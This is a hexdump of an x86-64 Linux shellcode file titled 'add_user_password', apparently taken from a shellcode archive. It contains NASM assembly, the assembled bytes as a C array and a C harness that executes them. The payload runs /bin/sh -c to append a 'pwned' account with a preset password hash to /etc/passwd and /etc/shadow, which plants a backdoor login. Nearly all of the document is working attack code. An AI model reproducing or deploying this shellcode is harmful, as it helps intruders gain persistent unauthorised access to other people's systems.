00000000  3b 20 73 68 65 6c 6c 63  6f 64 65 20 6e 61 6d 65  |; shellcode name|
00000010  20 61 64 64 5f 75 73 65  72 5f 70 61 73 73 77 6f  | add_user_passwo|
00000020  72 64 0a 3b 20 41 75 74  68 6f 72 20 20 20 20 3a  |rd.; Author    :|
00000030  20 43 68 72 69 73 74 6f  70 68 65 20 47 20 53 4c  | Christophe G SL|
00000040  41 45 36 34 2d 31 33 33  37 0a 3b 20 4c 65 6e 20  |AE64-1337.; Len |
00000050  20 20 20 20 20 20 3a 20  32 37 33 20 62 79 74 65  |      : 273 byte|
00000060  73 0a 3b 20 4c 61 6e 67  75 61 67 65 20 20 3a 20  |s.; Language  : |
00000070  4e 61 73 6d 0a 3b 20 22  6e 61 6d 65 20 3d 20 70  |Nasm.; "name = p|
00000080  77 6e 65 64 20 3b 20 70  61 73 73 20 3d 20 24 70  |wned ; pass = $p|
00000090  61 73 73 24 22 0a 3b 20  61 64 64 20 75 73 65 72  |ass$".; add user|
000000a0  20 61 6e 64 20 70 61 73  73 77 6f 72 64 20 77 69  | and password wi|
000000b0  74 68 20 65 63 68 6f 20  63 6d 64 0a 3b 20 74 65  |th echo cmd.; te|
000000c0  73 74 65 64 20 6b 61 6c  69 20 6c 69 6e 75 78 20  |sted kali linux |
000000d0  2c 20 6b 65 72 6e 65 6c  20 33 2e 31 32 0a 0a 0a  |, kernel 3.12...|
000000e0  0a 67 6c 6f 62 61 6c 20  5f 73 74 61 72 74 0a 0a  |.global _start..|
000000f0  5f 73 74 61 72 74 3a 0a  20 20 20 20 20 20 20 20  |_start:.        |
00000100  6a 6d 70 20 73 68 6f 72  74 20 66 69 6e 64 61 64  |jmp short findad|
00000110  64 72 65 73 73 0a 20 20  20 20 20 20 20 20 20 20  |dress.          |
00000120  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000150  20 20 20 20 20 20 20 0a  5f 72 65 61 6c 73 74 61  |       ._realsta|
00000160  72 74 3a 0a 20 20 20 20  20 20 20 20 70 6f 70 20  |rt:.        pop |
00000170  72 64 69 0a 20 20 20 20  20 20 20 20 78 6f 72 20  |rdi.        xor |
00000180  62 79 74 65 20 5b 72 64  69 20 2b 20 37 5d 20 2c  |byte [rdi + 7] ,|
00000190  20 30 78 34 31 20 3b 20  72 65 70 6c 61 63 65 20  | 0x41 ; replace |
000001a0  41 20 74 6f 20 6e 75 6c  6c 20 62 79 74 65 20 22  |A to null byte "|
000001b0  2f 62 69 6e 2f 73 68 41  22 0a 20 20 20 20 20 20  |/bin/shA".      |
000001c0  20 20 78 6f 72 20 62 79  74 65 20 5b 72 64 69 20  |  xor byte [rdi |
000001d0  2b 20 31 30 5d 20 20 2c  30 78 34 31 20 3b 20 73  |+ 10]  ,0x41 ; s|
000001e0  61 6d 65 20 22 2d 63 41  22 0a 20 20 20 20 20 20  |ame "-cA".      |
000001f0  20 20 78 6f 72 20 72 64  78 20 2c 20 72 64 78 0a  |  xor rdx , rdx.|
00000200  20 20 20 20 20 20 20 20  6c 65 61 20 72 64 69 20  |        lea rdi |
00000210  2c 20 5b 72 64 69 5d 0a  20 20 20 20 20 20 20 20  |, [rdi].        |
00000220  6c 65 61 20 72 39 20 2c  20 5b 72 64 69 20 2b 20  |lea r9 , [rdi + |
00000230  38 5d 0a 20 20 20 20 20  20 20 20 6c 65 61 20 72  |8].        lea r|
00000240  31 30 20 2c 20 5b 72 64  69 20 2b 20 31 31 5d 0a  |10 , [rdi + 11].|
00000250  20 20 20 20 20 20 20 20  70 75 73 68 20 72 64 78  |        push rdx|
00000260  0a 20 20 20 20 20 20 20  20 70 75 73 68 20 72 31  |.        push r1|
00000270  30 0a 20 20 20 20 20 20  20 20 70 75 73 68 20 72  |0.        push r|
00000280  39 0a 20 20 20 20 20 20  20 20 70 75 73 68 20 72  |9.        push r|
00000290  64 69 0a 20 20 20 20 20  20 20 20 6d 6f 76 20 72  |di.        mov r|
000002a0  73 69 20 2c 20 72 73 70  0a 20 20 20 20 20 20 20  |si , rsp.       |
000002b0  20 61 64 64 20 61 6c 20  2c 20 35 39 0a 20 20 20  | add al , 59.   |
000002c0  20 20 20 20 20 73 79 73  63 61 6c 6c 0a 0a 0a 66  |     syscall...f|
000002d0  69 6e 64 61 64 64 72 65  73 73 3a 0a 20 20 20 20  |indaddress:.    |
000002e0  20 20 20 20 63 61 6c 6c  20 5f 72 65 61 6c 73 74  |    call _realst|
000002f0  61 72 74 0a 20 20 20 20  20 20 20 20 73 74 72 69  |art.        stri|
00000300  6e 67 20 3a 20 64 62 20  22 2f 62 69 6e 2f 73 68  |ng : db "/bin/sh|
00000310  41 2d 63 41 65 63 68 6f  20 70 77 6e 65 64 3a 78  |A-cAecho pwned:x|
00000320  3a 31 30 30 31 3a 31 30  30 32 3a 70 77 6e 65 64  |:1001:1002:pwned|
00000330  2c 2c 2c 3a 2f 68 6f 6d  65 2f 70 77 6e 65 64 3a  |,,,:/home/pwned:|
00000340  2f 62 69 6e 2f 62 61 73  68 20 3e 3e 20 2f 65 74  |/bin/bash >> /et|
00000350  63 2f 70 61 73 73 77 64  20 3b 20 65 63 68 6f 20  |c/passwd ; echo |
00000360  70 77 6e 65 64 3a 5c 24  36 5c 24 75 69 48 37 78  |pwned:\$6\$uiH7x|
00000370  2e 76 68 69 76 44 37 4c  4c 58 59 5c 24 37 73 4b  |.vhivD7LLXY\$7sK|
00000380  31 4c 31 4b 57 2e 43 68  71 57 51 5a 6f 77 33 65  |1L1KW.ChqWQZow3e|
00000390  73 76 70 62 57 56 58 79  52 36 4c 41 34 33 31 74  |svpbWVXyR6LA431t|
000003a0  4f 4c 68 4d 6f 52 4b 6a  50 65 72 6b 47 62 78 52  |OLhMoRKjPerkGbxR|
000003b0  51 78 64 49 4a 4f 32 49  61 6d 6f 79 6c 37 79 61  |QxdIJO2Iamoyl7ya|
000003c0  56 4b 55 56 6c 51 38 44  4d 6b 33 67 63 48 4c 4f  |VKUVlQ8DMk3gcHLO|
000003d0  4f 66 2f 3a 31 36 32 36  31 3a 30 3a 39 39 39 39  |Of/:16261:0:9999|
000003e0  39 3a 37 3a 3a 3a 20 3e  3e 20 2f 65 74 63 2f 73  |9:7::: >> /etc/s|
000003f0  68 61 64 6f 77 22 0a 0a  75 6e 73 69 67 6e 65 64  |hadow"..unsigned|
00000400  20 63 68 61 72 20 63 6f  64 65 5b 5d 20 3d 20 5c  | char code[] = \|
00000410  0a 22 5c 78 65 62 5c 78  32 34 5c 78 35 66 5c 78  |."\xeb\x24\x5f\x|
00000420  38 30 5c 78 37 37 5c 78  30 37 5c 78 34 31 5c 78  |80\x77\x07\x41\x|
00000430  38 30 5c 78 37 37 5c 78  30 61 5c 78 34 31 5c 78  |80\x77\x0a\x41\x|
00000440  34 38 5c 78 33 31 5c 78  64 32 5c 78 34 38 5c 78  |48\x31\xd2\x48\x|
00000450  38 64 5c 78 33 66 5c 78  34 63 5c 78 38 64 5c 78  |8d\x3f\x4c\x8d\x|
00000460  34 66 5c 78 30 38 5c 78  34 63 5c 78 38 64 5c 78  |4f\x08\x4c\x8d\x|
00000470  35 37 5c 78 30 62 5c 78  35 32 5c 78 34 31 5c 78  |57\x0b\x52\x41\x|
00000480  35 32 5c 78 34 31 5c 78  35 31 5c 78 35 37 5c 78  |52\x41\x51\x57\x|
00000490  34 38 5c 78 38 39 5c 78  65 36 5c 78 30 34 5c 78  |48\x89\xe6\x04\x|
000004a0  33 62 5c 78 30 66 5c 78  30 35 5c 78 65 38 5c 78  |3b\x0f\x05\xe8\x|
000004b0  64 37 5c 78 66 66 5c 78  66 66 5c 78 66 66 5c 78  |d7\xff\xff\xff\x|
000004c0  32 66 5c 78 36 32 5c 78  36 39 5c 78 36 65 5c 78  |2f\x62\x69\x6e\x|
000004d0  32 66 5c 78 37 33 5c 78  36 38 5c 78 34 31 5c 78  |2f\x73\x68\x41\x|
000004e0  32 64 5c 78 36 33 5c 78  34 31 5c 78 36 35 5c 78  |2d\x63\x41\x65\x|
000004f0  36 33 5c 78 36 38 5c 78  36 66 5c 78 32 30 5c 78  |63\x68\x6f\x20\x|
00000500  37 30 5c 78 37 37 5c 78  36 65 5c 78 36 35 5c 78  |70\x77\x6e\x65\x|
00000510  36 34 5c 78 33 61 5c 78  37 38 5c 78 33 61 5c 78  |64\x3a\x78\x3a\x|
00000520  33 31 5c 78 33 30 5c 78  33 30 5c 78 33 31 5c 78  |31\x30\x30\x31\x|
00000530  33 61 5c 78 33 31 5c 78  33 30 5c 78 33 30 5c 78  |3a\x31\x30\x30\x|
00000540  33 32 5c 78 33 61 5c 78  37 30 5c 78 37 37 5c 78  |32\x3a\x70\x77\x|
00000550  36 65 5c 78 36 35 5c 78  36 34 5c 78 32 63 5c 78  |6e\x65\x64\x2c\x|
00000560  32 63 5c 78 32 63 5c 78  33 61 5c 78 32 66 5c 78  |2c\x2c\x3a\x2f\x|
00000570  36 38 5c 78 36 66 5c 78  36 64 5c 78 36 35 5c 78  |68\x6f\x6d\x65\x|
00000580  32 66 5c 78 37 30 5c 78  37 37 5c 78 36 65 5c 78  |2f\x70\x77\x6e\x|
00000590  36 35 5c 78 36 34 5c 78  33 61 5c 78 32 66 5c 78  |65\x64\x3a\x2f\x|
000005a0  36 32 5c 78 36 39 5c 78  36 65 5c 78 32 66 5c 78  |62\x69\x6e\x2f\x|
000005b0  36 32 5c 78 36 31 5c 78  37 33 5c 78 36 38 5c 78  |62\x61\x73\x68\x|
000005c0  32 30 5c 78 33 65 5c 78  33 65 5c 78 32 30 5c 78  |20\x3e\x3e\x20\x|
000005d0  32 66 5c 78 36 35 5c 78  37 34 5c 78 36 33 5c 78  |2f\x65\x74\x63\x|
000005e0  32 66 5c 78 37 30 5c 78  36 31 5c 78 37 33 5c 78  |2f\x70\x61\x73\x|
000005f0  37 33 5c 78 37 37 5c 78  36 34 5c 78 32 30 5c 78  |73\x77\x64\x20\x|
00000600  33 62 5c 78 32 30 5c 78  36 35 5c 78 36 33 5c 78  |3b\x20\x65\x63\x|
00000610  36 38 5c 78 36 66 5c 78  32 30 5c 78 37 30 5c 78  |68\x6f\x20\x70\x|
00000620  37 37 5c 78 36 65 5c 78  36 35 5c 78 36 34 5c 78  |77\x6e\x65\x64\x|
00000630  33 61 5c 78 35 63 5c 78  32 34 5c 78 33 36 5c 78  |3a\x5c\x24\x36\x|
00000640  35 63 5c 78 32 34 5c 78  37 35 5c 78 36 39 5c 78  |5c\x24\x75\x69\x|
00000650  34 38 5c 78 33 37 5c 78  37 38 5c 78 32 65 5c 78  |48\x37\x78\x2e\x|
00000660  37 36 5c 78 36 38 5c 78  36 39 5c 78 37 36 5c 78  |76\x68\x69\x76\x|
00000670  34 34 5c 78 33 37 5c 78  34 63 5c 78 34 63 5c 78  |44\x37\x4c\x4c\x|
00000680  35 38 5c 78 35 39 5c 78  35 63 5c 78 32 34 5c 78  |58\x59\x5c\x24\x|
00000690  33 37 5c 78 37 33 5c 78  34 62 5c 78 33 31 5c 78  |37\x73\x4b\x31\x|
000006a0  34 63 5c 78 33 31 5c 78  34 62 5c 78 35 37 5c 78  |4c\x31\x4b\x57\x|
000006b0  32 65 5c 78 34 33 5c 78  36 38 5c 78 37 31 5c 78  |2e\x43\x68\x71\x|
000006c0  35 37 5c 78 35 31 5c 78  35 61 5c 78 36 66 5c 78  |57\x51\x5a\x6f\x|
000006d0  37 37 5c 78 33 33 5c 78  36 35 5c 78 37 33 5c 78  |77\x33\x65\x73\x|
000006e0  37 36 5c 78 37 30 5c 78  36 32 5c 78 35 37 5c 78  |76\x70\x62\x57\x|
000006f0  35 36 5c 78 35 38 5c 78  37 39 5c 78 35 32 5c 78  |56\x58\x79\x52\x|
00000700  33 36 5c 78 34 63 5c 78  34 31 5c 78 33 34 5c 78  |36\x4c\x41\x34\x|
00000710  33 33 5c 78 33 31 5c 78  37 34 5c 78 34 66 5c 78  |33\x31\x74\x4f\x|
00000720  34 63 5c 78 36 38 5c 78  34 64 5c 78 36 66 5c 78  |4c\x68\x4d\x6f\x|
00000730  35 32 5c 78 34 62 5c 78  36 61 5c 78 35 30 5c 78  |52\x4b\x6a\x50\x|
00000740  36 35 5c 78 37 32 5c 78  36 62 5c 78 34 37 5c 78  |65\x72\x6b\x47\x|
00000750  36 32 5c 78 37 38 5c 78  35 32 5c 78 35 31 5c 78  |62\x78\x52\x51\x|
00000760  37 38 5c 78 36 34 5c 78  34 39 5c 78 34 61 5c 78  |78\x64\x49\x4a\x|
00000770  34 66 5c 78 33 32 5c 78  34 39 5c 78 36 31 5c 78  |4f\x32\x49\x61\x|
00000780  36 64 5c 78 36 66 5c 78  37 39 5c 78 36 63 5c 78  |6d\x6f\x79\x6c\x|
00000790  33 37 5c 78 37 39 5c 78  36 31 5c 78 35 36 5c 78  |37\x79\x61\x56\x|
000007a0  34 62 5c 78 35 35 5c 78  35 36 5c 78 36 63 5c 78  |4b\x55\x56\x6c\x|
000007b0  35 31 5c 78 33 38 5c 78  34 34 5c 78 34 64 5c 78  |51\x38\x44\x4d\x|
000007c0  36 62 5c 78 33 33 5c 78  36 37 5c 78 36 33 5c 78  |6b\x33\x67\x63\x|
000007d0  34 38 5c 78 34 63 5c 78  34 66 5c 78 34 66 5c 78  |48\x4c\x4f\x4f\x|
000007e0  36 36 5c 78 32 66 5c 78  33 61 5c 78 33 31 5c 78  |66\x2f\x3a\x31\x|
000007f0  33 36 5c 78 33 32 5c 78  33 36 5c 78 33 31 5c 78  |36\x32\x36\x31\x|
00000800  33 61 5c 78 33 30 5c 78  33 61 5c 78 33 39 5c 78  |3a\x30\x3a\x39\x|
00000810  33 39 5c 78 33 39 5c 78  33 39 5c 78 33 39 5c 78  |39\x39\x39\x39\x|
00000820  33 61 5c 78 33 37 5c 78  33 61 5c 78 33 61 5c 78  |3a\x37\x3a\x3a\x|
00000830  33 61 5c 78 32 30 5c 78  33 65 5c 78 33 65 5c 78  |3a\x20\x3e\x3e\x|
00000840  32 30 5c 78 32 66 5c 78  36 35 5c 78 37 34 5c 78  |20\x2f\x65\x74\x|
00000850  36 33 5c 78 32 66 5c 78  37 33 5c 78 36 38 5c 78  |63\x2f\x73\x68\x|
00000860  36 31 5c 78 36 34 5c 78  36 66 5c 78 37 37 22 0a  |61\x64\x6f\x77".|
00000870  3b 0a 0a 69 6e 74 20 6d  61 69 6e 28 29 0a 7b 0a  |;..int main().{.|
00000880  20 20 20 20 70 72 69 6e  74 66 28 22 53 68 65 6c  |    printf("Shel|
00000890  6c 63 6f 64 65 20 4c 65  6e 67 74 68 3a 20 20 25  |lcode Length:  %|
000008a0  64 5c 6e 22 2c 20 28 69  6e 74 29 73 74 72 6c 65  |d\n", (int)strle|
000008b0  6e 28 63 6f 64 65 29 29  3b 0a 20 20 20 20 28 2a  |n(code));.    (*|
000008c0  28 76 6f 69 64 20 20 28  2a 29 28 29 29 20 63 6f  |(void  (*)()) co|
000008d0  64 65 29 28 29 3b 0a 7d                           |de)();.}|
000008d8
